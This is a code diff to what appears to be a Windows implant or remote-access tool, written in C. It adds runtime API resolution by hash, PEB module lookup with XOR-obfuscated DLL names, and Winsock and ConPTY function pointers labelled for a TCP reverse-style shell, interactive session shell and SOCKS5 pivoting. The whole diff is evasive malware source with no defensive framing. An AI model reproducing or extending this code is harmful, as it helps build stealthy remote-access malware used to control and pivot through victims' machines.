@@ -133,8 +133,52 @@ PFN_Sleep fnSleep = NULL;
 PFN_VirtualAlloc fnVirtualAlloc = NULL;
 PFN_VirtualFree fnVirtualFree = NULL;
 
+/* Winsock2 — session mode */
+PFN_WSAStartup fnWSAStartup = NULL;
+PFN_WSACleanup fnWSACleanup = NULL;
+PFN_socket fnSocket = NULL;
+PFN_connect fnConnect = NULL;
+PFN_send fnSend = NULL;
+PFN_recv fnRecv = NULL;
+PFN_closesocket fnClosesocket = NULL;
+
+/* Winsock2 — shell TCP */
+PFN_inet_addr fnInet_addr = NULL;
+PFN_htons fnHtons = NULL;
+
+/* Winsock2 — SOCKS5 pivoting */
+PFN_getaddrinfo fnGetaddrinfo   = NULL;
+PFN_freeaddrinfo fnFreeaddrinfo = NULL;
+PFN_ioctlsocket fnIoctlsocket  = NULL;
+PFN_select fnSelect             = NULL;
+
+/* Kernel32 — threading (session mode) */
+PFN_CreateThread fnCreateThread = NULL;
+PFN_InitializeCriticalSection fnInitializeCriticalSection = NULL;
+PFN_EnterCriticalSection fnEnterCriticalSection = NULL;
+PFN_LeaveCriticalSection fnLeaveCriticalSection = NULL;
+PFN_DeleteCriticalSection fnDeleteCriticalSection = NULL;
+PFN_WaitForMultipleObjects fnWaitForMultipleObjects = NULL;
+
+/* Kernel32 — process/pipe extras */
+PFN_PeekNamedPipe fnPeekNamedPipe = NULL;
+PFN_CreateProcessW fnCreateProcessW = NULL;
+
+/* Kernel32 — ConPTY (session shell) */
+PFN_CreatePseudoConsole fnCreatePseudoConsole = NULL;
+PFN_ClosePseudoConsole fnClosePseudoConsole = NULL;
+PFN_ResizePseudoConsole fnResizePseudoConsole = NULL;
+PFN_InitializeProcThreadAttributeList fnInitializeProcThreadAttributeList = NULL;
+PFN_UpdateProcThreadAttribute fnUpdateProcThreadAttribute = NULL;
+PFN_DeleteProcThreadAttributeList fnDeleteProcThreadAttributeList = NULL;
+PFN_HeapAlloc fnHeapAlloc = NULL;
+PFN_GetProcessHeap fnGetProcessHeap = NULL;
+PFN_HeapFree fnHeapFree = NULL;
+
 void resolve_apis(void) {
-    HMODULE hK32  = peb_get_module(L"kernel32.dll");
+    wchar_t _k32w[ENC_DLL_KERNEL32_LEN + 1];
+    xor_dec_w(_k32w, ENC_DLL_KERNEL32, ENC_DLL_KERNEL32_LEN);
+    HMODULE hK32  = peb_get_module(_k32w);
     if (!hK32) ExitProcess(0);
 
     fnLoadLibraryA = (PFN_LoadLibraryA)resolve_hash(hK32, HASH_LoadLibraryA);
@@ -150,6 +194,7 @@ void resolve_apis(void) {
     char _iph[ENC_DLL_IPHLPAPI_LEN+1]; xor_dec(_iph, ENC_DLL_IPHLPAPI, ENC_DLL_IPHLPAPI_LEN);
     char _dns[ENC_DLL_DNSAPI_LEN+1]; xor_dec(_dns, ENC_DLL_DNSAPI, ENC_DLL_DNSAPI_LEN);
     char _net[ENC_DLL_NETAPI32_LEN+1]; xor_dec(_net, ENC_DLL_NETAPI32, ENC_DLL_NETAPI32_LEN);
+    char _ws2[ENC_DLL_WS2_32_LEN+1]; xor_dec(_ws2, ENC_DLL_WS2_32, ENC_DLL_WS2_32_LEN);
 
     HMODULE hWH   = fnLoadLibraryA(_wh);
     HMODULE hBC   = fnLoadLibraryA(_bc);
@@ -159,6 +204,7 @@ void resolve_apis(void) {
     HMODULE hIPH  = fnLoadLibraryA(_iph);
     HMODULE hDNS  = fnLoadLibraryA(_dns);
     HMODULE hNET  = fnLoadLibraryA(_net);
+    HMODULE hWS2  = fnLoadLibraryA(_ws2);
 
     #define RESOLVE(ptr, mod, name) \
         ptr = (PFN_##name)resolve_hash(mod, HASH_##name); \
@@ -240,6 +286,23 @@ void resolve_apis(void) {
 
     #undef RESOLVE
 
+    /* Winsock2 — session mode (soft resolve) */
+    if (hWS2) {
+        fnWSAStartup  = (PFN_WSAStartup) resolve_hash(hWS2, HASH_WSAStartup);
+        fnWSACleanup  = (PFN_WSACleanup) resolve_hash(hWS2, HASH_WSACleanup);
+        fnSocket      = (PFN_socket)     resolve_hash(hWS2, HASH_socket);
+        fnConnect     = (PFN_connect)    resolve_hash(hWS2, HASH_connect);
+        fnSend        = (PFN_send)       resolve_hash(hWS2, HASH_send);
+        fnRecv        = (PFN_recv)       resolve_hash(hWS2, HASH_recv);
+        fnClosesocket = (PFN_closesocket)resolve_hash(hWS2, HASH_closesocket);
+        fnInet_addr   = (PFN_inet_addr)  resolve_hash(hWS2, HASH_inet_addr);
+        fnHtons       = (PFN_htons)      resolve_hash(hWS2, HASH_htons);
+        fnGetaddrinfo  = (PFN_getaddrinfo)  resolve_hash(hWS2, HASH_getaddrinfo);
+        fnFreeaddrinfo = (PFN_freeaddrinfo) resolve_hash(hWS2, HASH_freeaddrinfo);
+        fnIoctlsocket  = (PFN_ioctlsocket)  resolve_hash(hWS2, HASH_ioctlsocket);
+        fnSelect       = (PFN_select)        resolve_hash(hWS2, HASH_select);
+    }
+
     /* Kernel32 — IAT cleanup (soft resolve) */
     #define RESOLVE_SOFT(ptr, mod, name) \
         ptr = (PFN_##name)resolve_hash(mod, HASH_##name)
@@ -293,6 +356,29 @@ void resolve_apis(void) {
     RESOLVE_SOFT(fnSleep,                  hK32,   Sleep);
     RESOLVE_SOFT(fnVirtualAlloc,           hK32,   VirtualAlloc);
     RESOLVE_SOFT(fnVirtualFree,            hK32,   VirtualFree);
+
+    /* Kernel32 — threading (session mode) */
+    RESOLVE_SOFT(fnCreateThread,                hK32, CreateThread);
+    RESOLVE_SOFT(fnInitializeCriticalSection,   hK32, InitializeCriticalSection);
+    RESOLVE_SOFT(fnEnterCriticalSection,        hK32, EnterCriticalSection);
+    RESOLVE_SOFT(fnLeaveCriticalSection,        hK32, LeaveCriticalSection);
+    RESOLVE_SOFT(fnDeleteCriticalSection,       hK32, DeleteCriticalSection);
+    RESOLVE_SOFT(fnWaitForMultipleObjects,      hK32, WaitForMultipleObjects);
+
+    /* Kernel32 — process/pipe extras */
+    RESOLVE_SOFT(fnPeekNamedPipe,              hK32, PeekNamedPipe);
+    RESOLVE_SOFT(fnCreateProcessW,             hK32, CreateProcessW);
+
+    /* Kernel32 — ConPTY (session shell) */
+    RESOLVE_SOFT(fnCreatePseudoConsole,               hK32, CreatePseudoConsole);
+    RESOLVE_SOFT(fnClosePseudoConsole,                hK32, ClosePseudoConsole);
+    RESOLVE_SOFT(fnResizePseudoConsole,               hK32, ResizePseudoConsole);
+    RESOLVE_SOFT(fnInitializeProcThreadAttributeList, hK32, InitializeProcThreadAttributeList);
+    RESOLVE_SOFT(fnUpdateProcThreadAttribute,         hK32, UpdateProcThreadAttribute);
+    RESOLVE_SOFT(fnDeleteProcThreadAttributeList,     hK32, DeleteProcThreadAttributeList);
+    RESOLVE_SOFT(fnHeapAlloc,                         hK32, HeapAlloc);
+    RESOLVE_SOFT(fnGetProcessHeap,                    hK32, GetProcessHeap);
+    RESOLVE_SOFT(fnHeapFree,                          hK32, HeapFree);
 
     #undef RESOLVE_SOFT
 }
